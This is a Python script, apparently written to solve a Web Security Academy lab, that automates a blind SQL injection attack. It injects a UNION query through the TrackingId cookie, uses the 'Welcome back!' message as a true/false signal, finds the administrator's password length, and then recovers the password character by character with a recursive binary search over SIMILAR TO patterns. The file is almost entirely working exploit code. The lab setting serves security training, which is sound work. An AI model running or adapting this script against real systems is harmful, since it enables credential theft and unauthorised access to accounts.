import string
import urllib.parse
import time
import requests
import sys
from bs4 import BeautifulSoup

# Adding this so I can use IntelliJ's play button.
# This value is only used if none is supplied from the command line.
MANUAL_CTF_URL = "https://ac191f2b1e846158c0581612000e00cf.web-security-academy.net/"
# Valid characters that will be used when finding the admin's password via SIMILAR TO with regex
VALID_CHARSET = string.ascii_lowercase + string.digits


# Helper functions
# -----------------

# Parse site URL
def getCtfUrl():
    try:
        site = sys.argv[1]
    except IndexError:
        site = MANUAL_CTF_URL
    if 'https://' in site:
        site = site.rstrip('/').lstrip('https://')
    return f'https://{site}/'


# Use this after getting any http response to make sure that the CTF site hasn't timed out
def checkIfTimedOut(response):
    if response.status_code == 504:
        raise Exception("CTF site has timed out, refresh challenge.")


# Provided the query AND clause, returns a formatted sql injection query string
def buildQuery(and_clause):
    return f"x' UNION SELECT username FROM users WHERE username='administrator' AND {and_clause}--"


# try_query
# returns True when the query provided results in tricking the site backend by injecting a true statement
# a.k.a when the WHERE clause is true, try_query returns true.
def try_query(query):
    print(f'Query: {query}')
    my_cookies = {'TrackingId': urllib.parse.quote_plus(query)}
    resp = requests.get(url, cookies=my_cookies)
    checkIfTimedOut(resp)
    soup = BeautifulSoup(resp.text, 'html.parser')
    if soup.find('div', text='Welcome back!'):
        return True
    else:
        return False


# Moving pw length provided impl here so that the main portion of my script can
# more succinctly hold my own impl.
def getPasswordLength():
    num = 1
    while True:
        attempt_qry = buildQuery(and_clause=f'length(password)={num}')
        print(f'Trying length {num}')
        if not try_query(attempt_qry):
            num = num + 1
        else:
            break
    print(f"Password length is {num}")
    return num


# Recursive binary search implementation:
# @Returns
#   next valid character in password
# @Args
#   charset: current range of chars to check if SIMILAR TO
#   pw_so_far: string with all valid chars found in the password so far
# base case:
#   try_query returns true when provided charset is one character
#       Note: if len(charset) is 1 and response true, return charset, else return empty string.
# incremental step:
#   find mid point of charset
# update step:
#   try binary_search(pass on same pw, first half of charset) and binary_search(pass on same pw, second half of charset)
#   return whichever half is not empty string
def binary_search(pw_so_far, charset):
    qry_succeeded = try_query(buildQuery(and_clause=f'password SIMILAR TO \'{pw_so_far}[{charset}]%\''))

    if not qry_succeeded:  # We can skip this branch of the recursive tree if the range didn't hold a valid char
        return ""
    if len(charset) == 1:
        return charset  # charset is a single character; the next valid character in the password

    mid = len(charset) // 2
    first_half = binary_search(pw_so_far, charset[:mid])
    return first_half if first_half != "" else binary_search(pw_so_far, charset[mid:])


if __name__ == "__main__":
    url = getCtfUrl()
    begin_time = time.perf_counter()

    pw_length = getPasswordLength()
    hold_password = ""
    while len(hold_password) < pw_length:
        next_char = binary_search(hold_password, VALID_CHARSET)
        hold_password = hold_password + next_char
        print(f'New char discovered; password so far: {hold_password}')

    # Now just confirm that the above loop found the correct password:
    if try_query(buildQuery(and_clause=f'password SIMILAR TO \'{hold_password}\'')):
        print(f'Search complete...\n`administrator` password is: {hold_password}\n')
    else:
        print(f'Something went wrong: {hold_password} seems to be an incorrect password.\n')

    print(f"Time elapsed is {time.perf_counter() - begin_time} (seconds)")
